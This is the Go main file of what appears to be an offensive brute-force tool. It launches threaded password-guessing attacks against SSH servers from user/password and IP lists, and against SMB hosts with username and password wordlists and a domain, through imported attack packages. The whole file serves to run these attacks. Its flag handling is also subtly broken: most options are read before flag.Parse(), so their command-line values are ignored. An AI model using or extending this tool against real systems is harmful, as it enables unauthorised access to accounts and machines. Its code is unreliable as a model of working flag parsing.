package main

import (
	"flag"
	"log"
	"strconv"

	"github.com/whiterabb17/brutebar/bruteshed"
	"github.com/whiterabb17/brutebar/smbdancer"
)

var (
	atckType string
	threads  int
	sleep    string
	// SSH Vars
	usrpwdList string
	ipList     string
	// SMB Vars
	smbhost  string
	smbport  int
	debug    bool
	domain   string
	userFile string
	pwdFile  string
)

// SMB: host, port, threadcount, userlist, passlist, domain, debug, sleep
// 		str   int   int          str       str       str     bool	str

// SSH: userpasslist, iplist, threadcount, timeout
//
//	str           str     str          str

func init() {
	atckType = *flag.String("atk", "ssh", "Attack type to use (ssh/smb)")
	threads = *flag.Int("t", 10, "Number of threads")
	sleep = *flag.String("s", "", "Sleep time in seconds (per thread)")
	// SSH Flags
	flag.StringVar(&usrpwdList, "up", "", "Path to <User> <Pass> list")
	flag.StringVar(&ipList, "l", "", "Path to IpList")
	// SMB Flags
	smbhost = *flag.String("h", "", "Target host")
	smbport = *flag.Int("p", 445, "Target port")
	userFile = *flag.String("u", "", "User wordlist")
	pwdFile = *flag.String("w", "", "Password list")
	domain = *flag.String("d", "WORKGROUP", "Domain")
	debug = *flag.Bool("v", false, "Debug")
}
func main() {
	flag.Parse()
	log.Println(atckType)
	log.Println(usrpwdList)
	log.Println(ipList)
	if atckType == "ssh" {
		bruteshed.SshBrute(usrpwdList, ipList, strconv.Itoa(threads), sleep)
	} else if atckType == "smb" {
		smbdancer.SmbBrute(smbhost, smbport, threads, userFile, pwdFile, domain, debug, sleep)
	} else {
		log.Println("Selected attack type is not supported.")
		log.Println("Valid attack options: ssh / smb")
	}
}
